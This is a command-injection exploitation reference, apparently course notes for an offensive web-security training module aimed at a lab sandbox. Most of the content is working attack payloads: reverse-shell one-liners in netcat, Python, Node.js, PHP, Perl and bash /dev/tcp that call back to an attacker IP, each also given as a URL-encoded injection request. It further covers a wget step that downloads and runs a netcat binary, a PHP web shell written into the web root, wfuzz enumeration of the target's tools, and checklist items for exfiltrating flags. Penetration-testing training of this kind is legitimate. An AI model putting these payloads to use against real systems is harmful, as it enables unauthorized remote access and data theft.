# Command Injection — Exploitation Reference (CI Sandbox Module)

A structured reference for enumerating capabilities and obtaining shells via command injection, based on the OSWA Command Injection module.

---

## 1. Enumerating Capabilities on the Target

**Why:** Before deploying shells/payloads, confirm what binaries/interpreters exist on the target so you don't waste time on tools that aren't there.

### Manual check with `which`
```
http://ci-sandbox:80/php/index.php?ip=127.0.0.1;which nc
```

### Automated check with `wfuzz`

Build a wordlist (`/home/kali/capability_checks_custom.txt`):
```
w00tw00t
wget
curl
fetch
gcc
cc
nc
socat
ping
netstat
ss
ifconfig
ip
hostname
php
python
python3
perl
java
```

Run wfuzz, filtering out 404s:
```bash
wfuzz -c -z file,/home/kali/capability_checks_custom.txt --hc 404 "http://ci-sandbox:80/php/index.php?ip=127.0.0.1;which FUZZ"
```

**How to interpret results:**
- `w00tw00t` is a non-existent baseline payload — note its response **byte size**.
- Any other payload returning a similar byte size to `w00tw00t` → binary does **not** exist.
- Any payload returning a **larger** byte size → binary **does** exist (the `which` command returned a path, adding bytes to the response).

### Common Linux capability targets

| Command | Used For |
|---|---|
| `wget` / `curl` / `fetch` | File Transfer |
| `gcc` / `cc` | Compilation |
| `nc` | Shells, File Transfer, Port Forwarding |
| `socat` | Shells, File Transfer, Port Forwarding |
| `ping` | Networking, Code Execution Verification |
| `netstat` / `ss` / `ifconfig` / `ip` / `hostname` | Networking |
| `php` / `python` / `python3` / `perl` / `java` | Shells, Code Execution |

### Common Windows capability targets

| Capability | Used For |
|---|---|
| PowerShell / Visual Basic | Code Execution, Enumeration, Movement, Payload Delivery |
| `tftp` / `ftp` / `certutil` | File Transfer |
| Python | Code Execution, Enumeration |
| .NET | Code Execution, Privesc, Payload Delivery |
| `ipconfig` / `netstat` / `hostname` | Networking |
| `systeminfo` | System info, patches, versioning, arch |

---

## 2. Reverse Shell — Netcat

**1. Start a listener:**
```bash
nc -nlvp 9090
```

**2. Verify execution privilege (pipe operator example, Node.js endpoint):**
```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|id
```

**3. Trigger the reverse shell (`-e` spawns `/bin/bash` on connect):**
```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|/bin/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
```

> Note: Some `nc` builds don't support `-e` — Kali's does.

---

## 3. Reverse Shell — Python

**Raw payload:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.51",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**What it does:**
1. Opens a TCP socket and connects to the listener.
2. `os.dup2()` redirects stdin/stdout/stderr to that socket.
3. `subprocess.call(["/bin/sh","-i"])` spawns an interactive shell over the socket.

**1. Start listener:**
```bash
nc -nlvp 9090
```

**2. Full URL-encoded endpoint:**
```
http://ci-sandbox/php/index.php?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.51%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

---

## 4. Reverse Shell — Node.js (chained file write + execute)

Since Node.js itself can be the vulnerable component, write a malicious `.js` file to a world-writable directory, then execute it with `node`.

**Raw payload:**
```bash
echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js
```

**1. Start listener:**
```bash
nc -nlvp 9090
```

**2. Full URL-encoded endpoint:**
```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo%20%22require(%27child_process%27).exec(%27nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash%27)%22%20%3E%20%2Fvar%2Ftmp%2Foffsec.js%20%3B%20node%20%2Fvar%2Ftmp%2Foffsec.js
```

---

## 5. Reverse Shell — PHP

Several PHP execution functions can run a shell after opening a socket with `fsockopen()`:

| Function | Behavior |
|---|---|
| `exec()` | Executes a program |
| `shell_exec()` | Executes via shell, returns output as string |
| `system()` | Executes and displays output |
| `passthru()` | Executes, displays raw output |
| `popen()` | Opens a process file pointer in a given mode (e.g. `"r"`) |

**Example one-liners:**
```bash
php -r '$sock=fsockopen("192.168.49.51",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.49.51",9090);system("/bin/sh -i <&3 >&3 2>&3");'
```

**1. Start listener:**
```bash
nc -nlvp 9090
```

**2. Unencoded endpoint (system() variant):**
```
http://ci-sandbox/php/index.php?ip=127.0.0.1;php -r "system(\"bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'\");"
```

**3. Full URL-encoded endpoint:**
```
http://ci-sandbox/php/index.php?ip=127.0.0.1;php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27%5C%22)%3B%22
```

> Tip: `phpinfo()` (if accessible, or invoked via injection: `php -r "phpinfo();"`) reveals `disable_functions` and `DOCUMENT_ROOT` — useful for confirming which functions are usable and where to drop files.

---

## 6. Reverse Shell — Perl

**Raw payload:**
```bash
perl -e 'use Socket;$i="192.168.49.51";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**What it does:**
1. Creates a TCP socket (`SOCK_STREAM`).
2. Connects to attacker IP/port.
3. Redirects STDIN/STDOUT/STDERR to the socket.
4. `exec("/bin/sh -i")` spawns an interactive shell.

**1. Start listener:**
```bash
nc -nlvp 9090
```

**2. Full URL-encoded endpoint:**
```
http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.49.51%22%3B%24p%3D9090%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27
```

---

## 7. File Transfer (No Shell Interpreter Available)

**Scenario:** Target is hardened — no scripting language available, but a download binary (`wget`, `curl`, etc.) exists.

**1. Stage the binary on your attack box:**
```bash
sudo cp /bin/nc /var/www/html/
sudo service apache2 start
```

**2. Raw payload — download, make executable, run:**
```bash
wget http://192.168.49.51:80/nc -O /var/tmp/nc ; chmod 755 /var/tmp/nc ; /var/tmp/nc -nv 192.168.49.51 9090 -e /bin/bash
```

**3. URL-encoded version:**
```
wget%20http://192.168.49.51:80/nc%20-O%20/var/tmp/nc%20;%20chmod%20755%20/var/tmp/nc%20;%20/var/tmp/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
```

**4. Start listener before sending the request:**
```bash
nc -nlvp 9090
```

---

## 8. Writing a Web Shell

**Use case:** No useful binaries/interpreters for a reverse shell, but you know the backend language (e.g., PHP) and have write access to the web root.

**1. Find the document root:**
```
http://ci-sandbox:80/php/index.php?ip=127.0.0.1;pwd
```

**2. Raw payload — write a PHP web shell using `passthru()`:**
```bash
echo "<pre><?php passthru(\$_GET['cmd']); ?></pre>" > /var/www/html/webshell.php
```

**3. URL-encoded endpoint:**
```
http://ci-sandbox:80/php/index.php?ip=127.0.0.1;echo+%22%3Cpre%3E%3C?php+passthru(\$_GET[%27cmd%27]);+?%3E%3C/pre%3E%22+%3E+/var/www/html/webshell.php
```

**4. Use the web shell:**
```
http://ci-sandbox:80/webshell.php?cmd=ls -lsa
```

**Limitation:** `passthru()` (and similar functions) spawn a *new process per request* — there's no persistent shell session, so `cd` doesn't persist between calls. Each command re-executes in the web root context. This is why web shells are typically used as a stepping stone to a full reverse shell, not an end goal.

---

## Quick Reference: Injection Operators

| Operator | Behavior |
|---|---|
| `;` | Runs next command regardless of first command's result |
| `&&` | Runs next command only if first succeeds |
| `\|\|` | Runs next command only if first fails |
| `\|` | Pipes output of first command into second |
| `` ` `` / `$()` | Inline command substitution |

## Quick Reference: URL-Encoding Cheat Table

| Character | Encoded |
|---|---|
| Space | `%20` or `+` |
| `;` | `%3B` |
| `&` | `%26` |
| `\|` | `%7C` |
| `"` | `%22` |
| `'` | `%27` |
| `<` | `%3C` |
| `>` | `%3E` |
| `$` | `%24` |
| `(` `)` | `%28` `%29` |
| `\` | `%5C` |

---

## Lab Checklist (from this module)

- [ ] Netcat reverse shell via CI Sandbox (Node.js endpoint) — retrieve flag in `/root/`
- [ ] Identify which line of the Python payload establishes the socket connection
- [ ] Identify which command in the Node.js chain launches the malicious payload as a server
- [ ] PHP shell at `/php/shell_exercise.php` — flag should appear in `/opt/`
- [ ] Identify which line of the Perl payload processes standard output
- [ ] File transfer at `/php/file_transfer_exercise.php` using a binary **other than** `wget`
- [ ] Identify the three world-writable (777) directories in Linux (excluding the listed exceptions)
- [ ] OpenNetAdmin case study — retrieve reverse shell, exfiltrate `flag.txt` from web root
